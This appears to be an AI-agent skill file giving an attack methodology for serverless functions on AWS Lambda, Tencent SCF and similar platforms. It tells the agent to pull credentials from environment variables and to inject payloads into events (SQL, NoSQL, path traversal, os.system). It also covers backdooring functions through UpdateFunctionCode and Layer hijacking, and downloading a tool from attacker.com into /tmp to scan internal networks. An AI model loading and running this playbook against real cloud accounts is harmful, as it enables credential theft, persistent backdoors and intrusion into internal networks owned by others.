---
name: serverless-attack
description: "Serverless/cloud function security testing and attacks. Use when the target involves AWS Lambda, Tencent Cloud SCF, Aliyun FC, Azure Functions, or other serverless services. Use it when an API Gateway backend turns out to be a Lambda/SCF trigger, when function operation permissions are obtained through cloud-aksk-exploit, or when vulnerabilities in cloud function code need to be analyzed. Covers event injection (HTTP/OSS/message queue trigger parameter tampering), environment variable leakage (hardcoded credential extraction), function code injection/override (UpdateFunctionCode), runtime exploitation (/tmp writes/Layer hijacking/dependency poisoning), and temporary credential abuse. Use this skill whenever any Lambda/SCF/cloud function, API Gateway, or serverless architecture is discovered"
zh-signals: "Serverless 云函数安全测试与攻击。信号:serverless,Lambda,SCF,云函数,事件注入,环境变量"
when-to-use: "Use when the target involves AWS Lambda, Tencent SCF, Aliyun FC, Azure Functions, or an API Gateway fronting serverless functions, and you need to test event injection, secret leakage, or function code abuse."
metadata:
  tags: "serverless,lambda,scf,cloud function,function,api gateway,event injection,environment variables,runtime,layer,trigger,temporary credentials"
  category: "cloud"
---

# Serverless/Cloud Function Attack Methodology

Serverless functions run in ephemeral containers, so traditional persistence and lateral movement approaches do not apply. The attack focus is: event injection (input tampering), credential extraction (environment variables/temporary tokens), and code injection (modifying the function code).

## Detailed Commands by Cloud Platform

Once the cloud platform is identified, load the matching reference to get the full commands:

- AWS Lambda → [references/lambda-techniques.md](references/lambda-techniques.md)
- Tencent Cloud SCF → [references/scf-techniques.md](references/scf-techniques.md)

## Phase 0: Generic Information Gathering

Regardless of the cloud platform, the first step is to enumerate the function list and obtain the function details (code + configuration + environment variables). Refer to the matching reference for the specific commands.

## Phase 1: Environment Variable Extraction (the fastest way to obtain credentials)

Developers frequently hardcode database passwords, API keys, and credentials of other services in environment variables. Common sensitive variable names:

- `DB_PASSWORD`, `DATABASE_URL`, `MONGODB_URI`
- `AWS_ACCESS_KEY_ID` (nested credentials), `TENCENTCLOUD_SECRET_ID`
- `SECRET_KEY`, `JWT_SECRET`, `API_KEY`
- `REDIS_URL`, `SMTP_PASSWORD`

## Phase 2: Function Code Analysis

```python
# Search for hardcoded credentials
grep -rn "password\|secret\|key\|token\|credential" lambda_code/

# Search for unsafe input handling
grep -rn "eval\|exec\|os.system\|subprocess\|pickle\|yaml.load" lambda_code/

# Search for SQL concatenation
grep -rn "format\|f'\|%s.*query\|execute" lambda_code/

# Check dependency versions
cat lambda_code/requirements.txt  # Python
cat lambda_code/package.json      # Node.js
```

## Phase 3: Event Injection

Serverless functions are triggered by "events", and the event data is the input — if the function does not properly validate the event data, injection is possible.

### 3.1 API Gateway → Lambda/SCF Injection

API Gateway wraps the HTTP request into an event and passes it to the function:

```json
{
  "httpMethod": "POST",
  "path": "/api/query",
  "queryStringParameters": {"id": "1' OR '1'='1"},
  "body": "{\"username\": {\"$ne\": \"\"}}",
  "headers": {"X-Forwarded-For": "127.0.0.1"}
}
```

Common injection points:
- `queryStringParameters` → SQL/NoSQL injection
- `body` → deserialization/command injection
- `headers` → SSRF/log injection
- `pathParameters` → path traversal

### 3.2 OSS/COS/S3 Trigger Injection

Object storage triggers pass file information as the event:

```json
{
  "Records": [{
    "s3": {
      "bucket": {"name": "my-bucket"},
      "object": {"key": "../../../etc/passwd"}
    }
  }]
}
```

If the function concatenates `event['key']` into a file path for `open()` → path traversal.
If the function processes uploaded file content (such as XML/images/CSV) → XXE/SSRF/command injection.

### 3.3 Message Queue Triggers

SQS/CMQ/Kafka messages are passed in as the event:
```json
{"Records": [{"body": "'; import os; os.system('id'); '"}]}
```

## Phase 4: Code Injection/Override

This requires the UpdateFunctionCode permission. Refer to the cloud platform reference for the specific commands.

Core idea: replace the function with malicious code so that it both performs its original function and plants a backdoor (e.g. accepting a cmd parameter to execute commands).

### Layer Hijacking (specific to AWS Lambda)

Lambda Layers are shared code libraries, so modifying a Layer can affect every function that uses it. See [references/lambda-techniques.md](references/lambda-techniques.md).

## Phase 5: Runtime Environment Exploitation

### /tmp Directory Exploitation

/tmp is the only writable directory of a serverless function, and it is preserved across "warm starts":

```bash
# Write a tool to /tmp
curl -o /tmp/fscan http://attacker.com/fscan && chmod +x /tmp/fscan

# If the function has internal network access (in a VPC), use the tool in /tmp to scan the internal network
/tmp/fscan -h 172.16.0.0/16 -p 22,3306,6379
```

## Decision Tree

```
Serverless function discovered
├── Identify the cloud platform → load the matching reference (lambda-techniques / scf-techniques)
├── Has GetFunction permission → download the code → audit → find vulnerabilities/credentials
├── Has GetFunctionConfiguration permission → read environment variables → extract credentials
├── Has UpdateFunctionCode permission → inject a backdoor → RCE
├── Has Invoke permission → craft a malicious event → event injection
├── Only has an API Gateway entry point → HTTP request layer injection (SQLi/NoSQL/SSRF)
└── No direct permission → upload a malicious file via an S3/COS trigger
```
